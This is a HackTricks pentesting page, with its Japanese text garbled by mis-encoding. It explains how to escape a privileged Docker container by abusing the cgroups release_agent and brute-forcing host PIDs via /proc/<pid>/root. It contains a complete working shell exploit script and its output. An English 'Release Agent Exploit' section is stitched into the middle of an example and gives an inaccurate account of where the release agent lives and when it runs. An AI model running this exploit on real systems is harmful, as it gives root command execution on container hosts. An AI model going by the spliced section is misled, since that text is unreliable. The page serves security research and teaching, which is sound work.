<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã‚’å…¥æ‰‹ã—ãŸã„**ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚

- [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚

- [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>


# ã¯ã˜ã‚ã«

å‰ã®PoCã¯ã€ã‚³ãƒ³ãƒ†ãƒŠãŒ**ãƒã‚¦ãƒ³ãƒˆãƒã‚¤ãƒ³ãƒˆã®ãƒ›ã‚¹ãƒˆãƒ‘ã‚¹ã‚’å…¬é–‹ã™ã‚‹**ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸ãƒ‰ãƒ©ã‚¤ãƒã§æ§‹æˆã•ã‚Œã¦ã„ã‚‹å ´åˆã«ã¯å•é¡Œã‚ã‚Šã¾ã›ã‚“ãŒã€**ãƒ›ã‚¹ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã®ãƒã‚¦ãƒ³ãƒˆãƒã‚¤ãƒ³ãƒˆãŒæ˜ç¤ºçš„ã«é–‹ç¤ºã•ã‚Œã¦ã„ãªã„**æ§‹æˆã‚‚ã‚ã‚Šã¾ã™ã€‚

ã“ã®PoCã§ã¯ã€ãƒ›ã‚¹ãƒˆå†…ã®ã‚³ãƒ³ãƒ†ãƒŠPIDã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«ã€ãƒ›ã‚¹ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ å†…ã®ã‚³ãƒ³ãƒ†ãƒŠãŒé…ç½®ã•ã‚Œã¦ã„ã‚‹ãƒ‘ã‚¹ã®ä»£ã‚ã‚Šã«ã€ç›¸å¯¾ãƒ‘ã‚¹ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

## ãƒ›ã‚¹ãƒˆå†…ã®ãƒ‘ã‚¹ã®å ´æ‰€ã‚’å…¬é–‹ã—ãªã„ã‚³ãƒ³ãƒ†ãƒŠã®ä¾‹

### Kata Containers
```
root@container:~$ head -1 /etc/mtab
kataShared on / type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
```
[Kata Containers](https://katacontainers.io)ã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã‚³ãƒ³ãƒ†ãƒŠã®ãƒ«ãƒ¼ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã‚’`9pfs`ä¸Šã«ãƒã‚¦ãƒ³ãƒˆã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€Kata Containersä»®æƒ³ãƒã‚·ãƒ³å†…ã®ã‚³ãƒ³ãƒ†ãƒŠãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã®å ´æ‰€ã«é–¢ã™ã‚‹æƒ…å ±ã¯æ¼æ´©ã—ã¾ã›ã‚“ã€‚

### ãƒ‡ãƒã‚¤ã‚¹ãƒãƒƒãƒ‘ãƒ¼
```
root@container:~$ head -1 /etc/mtab
/dev/sdc / ext4 rw,relatime,stripe=384 0 0
```
ç§ã¯ãƒ©ã‚¤ãƒ–ç’°å¢ƒã§ã“ã®ãƒ«ãƒ¼ãƒˆãƒã‚¦ãƒ³ãƒˆã‚’æŒã¤ã‚³ãƒ³ãƒ†ãƒŠã‚’è¦‹ã¾ã—ãŸã€‚ã‚³ãƒ³ãƒ†ãƒŠã¯ç‰¹å®šã®`devicemapper`ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸ãƒ‰ãƒ©ã‚¤ãƒã®è¨­å®šã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã¨æ€ã„ã¾ã™ãŒã€ãƒ†ã‚¹ãƒˆç’°å¢ƒã§ã“ã®å‹•ä½œã‚’å†ç¾ã™ã‚‹ã“ã¨ãŒã§ãã¾ã›ã‚“ã§ã—ãŸã€‚

# PoC

å¿…è¦ãªã®ã¯ã€ã‚³ãƒ³ãƒ†ãƒŠå†…ã§å®Ÿè¡Œã™ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã®**ã‚³ãƒ³ãƒ†ãƒŠãƒ›ã‚¹ãƒˆã«å¯¾ã™ã‚‹å®Œå…¨ãªãƒ‘ã‚¹ï¼ˆç›¸å¯¾ï¼‰**ã§ã™ã€‚ã‚³ãƒ³ãƒ†ãƒŠå†…ã®ãƒã‚¦ãƒ³ãƒˆãƒã‚¤ãƒ³ãƒˆã‹ã‚‰ã“ã‚Œã‚’åˆ¤åˆ¥ã™ã‚‹ã“ã¨ãŒã§ããªã„å ´åˆã€ä»–ã®å ´æ‰€ã‚’æ¢ã™å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

## /proc/\<pid>/root

Linuxã®`/proc`æ“¬ä¼¼ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã¯ã€ã‚·ã‚¹ãƒ†ãƒ ä¸Šã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã™ã¹ã¦ã®ãƒ—ãƒ­ã‚»ã‚¹ã€ä¾‹ãˆã°ã‚³ãƒ³ãƒ†ãƒŠå†…ã®ãƒ—ãƒ­ã‚»ã‚¹ã‚’å«ã‚€ã€ç•°ãªã‚‹ãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ãƒ—ãƒ­ã‚»ã‚¹ã®ã‚«ãƒ¼ãƒãƒ«ãƒ—ãƒ­ã‚»ã‚¹ãƒ‡ãƒ¼ã‚¿æ§‹é€ ã‚’å…¬é–‹ã—ã¾ã™ã€‚ã“ã‚Œã¯ã€ã‚³ãƒ³ãƒ†ãƒŠå†…ã§ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã€ãƒ›ã‚¹ãƒˆä¸Šã®ãƒ—ãƒ­ã‚»ã‚¹ã®`/proc`ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã§ç¤ºã™ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
root@container:~$ sleep 100
```

```bash
root@host:~$ ps -eaf | grep sleep
root     28936 28909  0 10:11 pts/0    00:00:00 sleep 100
root@host:~$ ls -la /proc/`pidof sleep`
total 0
dr-xr-xr-x   9 root root 0 Nov 19 10:03 .
dr-xr-xr-x 430 root root 0 Nov  9 15:41 ..
dr-xr-xr-x   2 root root 0 Nov 19 10:04 attr
-rw-r--r--   1 root root 0 Nov 19 10:04 autogroup
-r--------   1 root root 0 Nov 19 10:04 auxv
-r--r--r--   1 root root 0 Nov 19 10:03 cgroup
--w-------   1 root root 0 Nov 19 10:04 clear_refs
-r--r--r--   1 root root 0 Nov 19 10:04 cmdline
...
-rw-r--r--   1 root root 0 Nov 19 10:29 projid_map
lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -> /
-rw-r--r--   1 root root 0 Nov 19 10:29 sched
...
```
_ã¡ãªã¿ã«ã€`/proc/<pid>/root`ãƒ‡ãƒ¼ã‚¿æ§‹é€ ã¯ã€ç§ãŒéå¸¸ã«é•·ã„é–“æ··ä¹±ã—ã¦ã„ãŸã‚‚ã®ã§ã—ãŸã€‚ãªãœ`/`ã¸ã®ã‚·ãƒ³ãƒœãƒªãƒƒã‚¯ãƒªãƒ³ã‚¯ãŒæœ‰ç”¨ãªã®ã‹ç†è§£ã§ãã¾ã›ã‚“ã§ã—ãŸãŒã€manãƒšãƒ¼ã‚¸ã®å®Ÿéš›ã®å®šç¾©ã‚’èª­ã‚“ã§ã‹ã‚‰ç†è§£ã§ãã¾ã—ãŸã€‚_

> /proc/\[pid]/root
>
> UNIXã¨Linuxã¯ã€chroot(2)ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã«ã‚ˆã£ã¦è¨­å®šã•ã‚Œã‚‹ãƒ—ãƒ­ã‚»ã‚¹ã”ã¨ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã®ãƒ«ãƒ¼ãƒˆã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ã€‚ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯ã€ãƒ—ãƒ­ã‚»ã‚¹ã®ãƒ«ãƒ¼ãƒˆãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’æŒ‡ã™ã‚·ãƒ³ãƒœãƒªãƒƒã‚¯ãƒªãƒ³ã‚¯ã§ã‚ã‚Šã€exeã‚„fd/\*ã¨åŒã˜ã‚ˆã†ã«å‹•ä½œã—ã¾ã™ã€‚
>
> ãŸã ã—ã€ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯å˜ãªã‚‹ã‚·ãƒ³ãƒœãƒªãƒƒã‚¯ãƒªãƒ³ã‚¯ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ãƒ—ãƒ­ã‚»ã‚¹è‡ªä½“ã¨åŒã˜ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã®ãƒ“ãƒ¥ãƒ¼ï¼ˆåå‰ç©ºé–“ã¨ãƒ—ãƒ­ã‚»ã‚¹ã”ã¨ã®ãƒã‚¦ãƒ³ãƒˆã®ã‚»ãƒƒãƒˆã‚’å«ã‚€ï¼‰ã‚’æä¾›ã—ã¾ã™ã€‚

**`/proc/<pid>/root`ã‚·ãƒ³ãƒœãƒªãƒƒã‚¯ãƒªãƒ³ã‚¯ã¯ã€ã‚³ãƒ³ãƒ†ãƒŠå†…ã®ä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¸ã®ãƒ›ã‚¹ãƒˆç›¸å¯¾ãƒ‘ã‚¹ã¨ã—ã¦ä½¿ç”¨ã§ãã¾ã™**:
```bash
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```

```bash
root@host:~$ cat /proc/`pidof sleep`/root/findme
findme
```
{% hint style="warning" %}
**æ”»æ’ƒã®è¦ä»¶ãŒã€ã‚³ãƒ³ãƒ†ãƒŠå†…ã®ãƒ•ã‚¡ã‚¤ãƒ«ã®å®Œå…¨ãªãƒ‘ã‚¹ã‚’çŸ¥ã‚‹ã“ã¨ã‹ã‚‰ã€ã‚³ãƒ³ãƒ†ãƒŠå†…ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹**_**ä»»æ„ã®**_**ãƒ—ãƒ­ã‚»ã‚¹ã®pidã‚’çŸ¥ã‚‹ã“ã¨ã«å¤‰æ›´ã•ã‚Œã¾ã™ã€‚**
{% endhint %}

## Pid Bashing <a href="#pid-bashing" id="pid-bashing"></a>

ã“ã‚Œã¯å®Ÿéš›ã«ã¯ç°¡å˜ãªéƒ¨åˆ†ã§ã™ã€‚Linuxã§ã¯ã€ãƒ—ãƒ­ã‚»ã‚¹IDã¯æ•°å€¤ã§ã‚ã‚Šã€é †æ¬¡å‰²ã‚Šå½“ã¦ã‚‰ã‚Œã¾ã™ã€‚`init`ãƒ—ãƒ­ã‚»ã‚¹ã«ã¯ãƒ—ãƒ­ã‚»ã‚¹ID `1`ãŒå‰²ã‚Šå½“ã¦ã‚‰ã‚Œã€ãã‚Œä»¥é™ã®ãƒ—ãƒ­ã‚»ã‚¹ã«ã¯å¢—åˆ†ã®IDãŒå‰²ã‚Šå½“ã¦ã‚‰ã‚Œã¾ã™ã€‚**ã‚³ãƒ³ãƒ†ãƒŠå†…ã®ãƒ—ãƒ­ã‚»ã‚¹ã®ãƒ›ã‚¹ãƒˆãƒ—ãƒ­ã‚»ã‚¹IDã‚’ç‰¹å®šã™ã‚‹ãŸã‚ã«ã€ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã®å¢—åˆ†æ¤œç´¢ãŒä½¿ç”¨ã•ã‚Œã¾ã™**ï¼š
```
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```
# Docker Breakout Privilege Escalation: Release Agent Exploit (Relative Paths to PIDs)

## Introduction

In this technique, we will exploit the release agent feature in Docker to escalate privileges and break out of the container. The release agent is a script that is executed when a container is stopped or killed. By manipulating the release agent script, we can execute arbitrary commands with root privileges on the host system.

## Exploit Steps

1. Identify the release agent script: The release agent script is usually located at `/var/lib/docker/containers/<container_id>/release-agent`. We need to find the container ID first.

2. Find the container ID: We can use the `docker ps` command to list all running containers and their IDs.

3. Locate the release agent script: Once we have the container ID, we can navigate to the corresponding directory using the command `cd /var/lib/docker/containers/<container_id>/`.

4. Edit the release agent script: We can use any text editor to modify the release agent script. Add the desired commands that will be executed with root privileges on the host system.

5. Save and exit the text editor: After making the necessary changes, save the file and exit the text editor.

6. Restart the container: Restart the container using the `docker restart <container_id>` command. This will trigger the execution of the modified release agent script.

7. Verify the privilege escalation: Check if the commands added to the release agent script were executed successfully on the host system.

## Mitigation

To prevent this privilege escalation technique, follow these best practices:

- Regularly update Docker to the latest version to ensure that security vulnerabilities are patched.
- Limit the use of the release agent feature and only allow trusted scripts to be executed.
- Implement strict access controls and permissions for Docker containers and the host system.
- Monitor and log all Docker container activities for suspicious behavior.

By following these mitigation measures, you can reduce the risk of privilege escalation through the release agent exploit.
```bash
root@host:~$ COUNTER=1
root@host:~$ while [ ! -f /proc/${COUNTER}/root/findme ]; do COUNTER=$((${COUNTER} + 1)); done
root@host:~$ echo ${COUNTER}
7822
root@host:~$ cat /proc/${COUNTER}/root/findme
findme
```
## ã™ã¹ã¦ã‚’çµ„ã¿åˆã‚ã›ã‚‹ <a href="#putting-it-all-together" id="putting-it-all-together"></a>

ã“ã®æ”»æ’ƒã‚’å®Œäº†ã™ã‚‹ãŸã‚ã«ã€ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æŠ€è¡“ã‚’ä½¿ç”¨ã—ã¦ã€ãƒ‘ã‚¹ `/proc/<pid>/root/payload.sh` ã® PID ã‚’æ¨æ¸¬ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚**å„åå¾©ã”ã¨ã«**ã€æ¨æ¸¬ã•ã‚ŒãŸ pid ãƒ‘ã‚¹ã‚’ cgroups ã® `release_agent` ãƒ•ã‚¡ã‚¤ãƒ«ã«æ›¸ãè¾¼ã¿ã€`release_agent` ã‚’ãƒˆãƒªã‚¬ãƒ¼ã—ã€å‡ºåŠ›ãƒ•ã‚¡ã‚¤ãƒ«ãŒä½œæˆã•ã‚Œã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¾ã™ã€‚

ã“ã®æŠ€è¡“ã®å”¯ä¸€ã®æ³¨æ„ç‚¹ã¯ã€ãã‚ŒãŒæ±ºã—ã¦å¾®å¦™ãªæ–¹æ³•ã§ã¯ãªãã€pid ã®æ•°ã‚’éå¸¸ã«é«˜ãã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã¨ã„ã†ã“ã¨ã§ã™ã€‚é•·æ™‚é–“å®Ÿè¡Œã•ã‚Œã‚‹ãƒ—ãƒ­ã‚»ã‚¹ã¯å®Ÿè¡Œã•ã‚Œãªã„ãŸã‚ã€ä¿¡é ¼æ€§ã®å•é¡Œã¯ç™ºç”Ÿã—ãªã„ã¯ãšã§ã™ãŒã€ç§ã®è¨€è‘‰ã‚’å¼•ç”¨ã—ãªã„ã§ãã ã•ã„ã€‚

ä»¥ä¸‹ã® PoC ã¯ã€**cgroups ã® `release_agent` æ©Ÿèƒ½**ã‚’ä½¿ç”¨ã—ã¦ç‰¹æ¨©ã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰ã®è„±å‡ºã‚’å®Ÿç¾ã™ã‚‹ãŸã‚ã«ã€Felix ã®å…ƒã® PoC ã§æœ€åˆã«æç¤ºã•ã‚ŒãŸã‚‚ã®ã‚ˆã‚Šã‚‚ä¸€èˆ¬çš„ãªæ”»æ’ƒã‚’æä¾›ã™ã‚‹ãŸã‚ã«ã“ã‚Œã‚‰ã®æŠ€è¡“ã‚’å®Ÿè£…ã—ã¦ã„ã¾ã™ã€‚
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
ç‰¹æ¨©ä»˜ãã‚³ãƒ³ãƒ†ãƒŠå†…ã§PoCã‚’å®Ÿè¡Œã™ã‚‹ã¨ã€æ¬¡ã®ã‚ˆã†ãªå‡ºåŠ›ãŒå¾—ã‚‰ã‚Œã‚‹ã¯ãšã§ã™ã€‚
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
# å‚è€ƒæ–‡çŒ®

* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚

- [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚

- [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
